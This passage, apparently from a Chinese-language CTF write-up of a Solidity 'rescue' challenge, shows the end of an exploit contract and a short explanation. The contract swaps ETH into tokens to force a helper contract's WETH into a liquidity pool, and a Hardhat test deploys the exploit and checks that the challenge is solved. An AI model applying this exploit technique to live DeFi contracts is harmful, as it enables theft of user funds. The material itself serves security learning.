		<span class="token punctuation">)</span><span class="token punctuation">;</span>

		path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>weth<span class="token punctuation">)</span><span class="token punctuation">;</span>
		path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> dai<span class="token punctuation">;</span>
		router<span class="token punctuation">.</span><span class="token function">swapExactTokensForTokens</span><span class="token punctuation">(</span>
			<span class="token number">9</span> ether<span class="token punctuation">,</span>
			<span class="token number">0</span><span class="token punctuation">,</span>
			path<span class="token punctuation">,</span>
			<span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
			block<span class="token punctuation">.</span>timestamp
		<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token builtin">uint256</span> daiIn <span class="token operator">=</span> <span class="token number">50</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token number">18</span><span class="token punctuation">;</span>								
		<span class="token function">ERC20Like</span><span class="token punctuation">(</span>dai<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>mcHelper<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
		mcHelper<span class="token punctuation">.</span><span class="token function">swapTokenForPoolToken</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> dai<span class="token punctuation">,</span> daiIn<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</pre><p>&#x8FD9;&#x91CC;&#x5148;&#x7528;11&#x4E2A;ETH&#x53BB;&#x4EA4;&#x6362;usdc,&#x4EA4;&#x6362;&#x5F97;&#x5230;&#x7684;usdc&#x53D1;&#x9001;&#x5230;<code>mcHelper</code>&#x5408;&#x7EA6;,&#x8FD9;&#x91CC;&#x7684;11&#x4E2A;ETH&#x5176;&#x5B9E;&#x53EA;&#x8981;&#x5927;&#x4E8E;10&#x5373;&#x53EF;,&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x5C06;<code>mcHelper</code>&#x91CC;&#x7684;WETH&#x5168;&#x90E8;&#x52A0;&#x5230;&#x6D41;&#x52A8;&#x6027;&#x6C60;&#x5B50;&#x91CC;.<br>
&#x7136;&#x540E;&#x6211;&#x6362;&#x4E00;&#x4E9B;dai&#x5230;&#x81EA;&#x5DF1;&#x5408;&#x7EA6;,&#x4EE5;&#x4FBF;&#x4E8E;&#x89E6;&#x53D1;<code>mcHelper</code>&#x7684;<code>swapTokenForPoolToken()</code>&#x51FD;&#x6570;</p>
<p>js&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre data-role="codeBlock" data-info="javascript" class="language-javascript"><span class="token keyword keyword-const">const</span> <span class="token punctuation">{</span> expect <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;chai&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword keyword-const">const</span> <span class="token punctuation">{</span> ethers <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&apos;hardhat&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword keyword-const">const</span> masterLike <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&apos;../contracts/rescue/MatserChefLike.json&apos;</span><span class="token punctuation">)</span>
<span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">&quot;Challange rescue&quot;</span><span class="token punctuation">,</span> <span class="token keyword keyword-function">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword keyword-let">let</span> attacker<span class="token punctuation">,</span>deployer<span class="token punctuation">;</span>
    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">&quot;should return the solved&quot;</span><span class="token punctuation">,</span> <span class="token keyword keyword-async">async</span> <span class="token keyword keyword-function">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">[</span>attacker<span class="token punctuation">,</span>deployer<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword control-flow keyword-await">await</span> ethers<span class="token punctuation">.</span><span class="token method function property-access">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword keyword-const">const</span> <span class="token maybe-class-name">Weth</span> <span class="token operator">=</span> <span class="token keyword control-flow keyword-await">await</span> ethers<span class="token punctuation">.</span><span class="token method function property-access">getContractAt</span><span class="token punctuation">(</span><span class="token string">&quot;WETH9&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;</span><span class="token punctuation">,</span> attacker<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword keyword-const">const</span> <span class="token maybe-class-name">SetupFactory</span> <span class="token operator">=</span> <span class="token keyword control-flow keyword-await">await</span> ethers<span class="token punctuation">.</span><span class="token method function property-access">getContractFactory</span><span class="token punctuation">(</span><span class="token string">&quot;Setup&quot;</span><span class="token punctuation">,</span> attacker<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
        <span class="token keyword keyword-const">const</span> setup <span class="token operator">=</span> <span class="token keyword control-flow keyword-await">await</span> <span class="token maybe-class-name">SetupFactory</span><span class="token punctuation">.</span><span class="token method function property-access">deploy</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            value<span class="token operator">:</span> ethers<span class="token punctuation">.</span><span class="token property-access">utils</span><span class="token punctuation">.</span><span class="token method function property-access">parseEther</span><span class="token punctuation">(</span><span class="token string">&quot;50&quot;</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">//Exploit</span>
        <span class="token comment">// let abi = [{&quot;inputs&quot;:[{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;poolInfo&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;lpToken&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;allocPoint&quot;,&quot;type&quot;:&quot;uint256&quot;},{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;lastRewardBlock&quot;,&quot;type&quot;:&quot;uint256&quot;},{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;accSushiPerShare&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;}];</span>
        <span class="token comment">// let contractAddress = &quot;0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd&quot;;</span>
        <span class="token comment">// let provider = await ethers.getDefaultProvider();</span>
        <span class="token comment">// const MasterLike = new ethers.Contract(contractAddress, abi, provider);</span>
        <span class="token comment">// // const MasterLike = await ethers.getContractAt(&quot;MasterChefLike&quot;,&quot;0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd&quot;, deployer);</span>
        <span class="token comment">// for(let i = 0; i &lt; 5; i++){</span>
        <span class="token comment">//     let tx = await MasterLike.connect(attacker).poolInfo(i);</span>
        <span class="token comment">//     let pool_info = await tx.wait();</span>
        <span class="token comment">//     // let pool_info = MasterLike.connect(attacker).poolInfo(i);</span>
        <span class="token comment">//     // let lp_token = tx[i];</span>
        <span class="token comment">//     // console.log(pool_info);</span>
        <span class="token comment">//     console.log(tx);</span>
        <span class="token comment">//     console.log(pool_info);</span>
        <span class="token comment">// }</span>

        <span class="token keyword keyword-const">const</span> <span class="token maybe-class-name">ExploitFactory</span> <span class="token operator">=</span> <span class="token keyword control-flow keyword-await">await</span> ethers<span class="token punctuation">.</span><span class="token method function property-access">getContractFactory</span><span class="token punctuation">(</span><span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">,</span>attacker<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword keyword-const">const</span> exploit <span class="token operator">=</span> <span class="token keyword control-flow keyword-await">await</span> <span class="token maybe-class-name">ExploitFactory</span><span class="token punctuation">.</span><span class="token method function property-access">deploy</span><span class="token punctuation">(</span>setup<span class="token punctuation">.</span><span class="token property-access">address</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>value <span class="token operator">:</span> ethers<span class="token punctuation">.</span><span class="token property-access">utils</span><span class="token punctuation">.</span><span class="token method function property-access">parseEther</span><span class="token punctuation">(</span><span class="token string">&quot;50&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword control-flow keyword-await">await</span> setup<span class="token punctuation">.</span><span class="token method function property-access">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">to</span><span class="token punctuation">.</span><span class="token method function property-access">equal</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
</pre>
      </div>
      
      
    
    
    
    
    
    
    
    
  
    </body></html>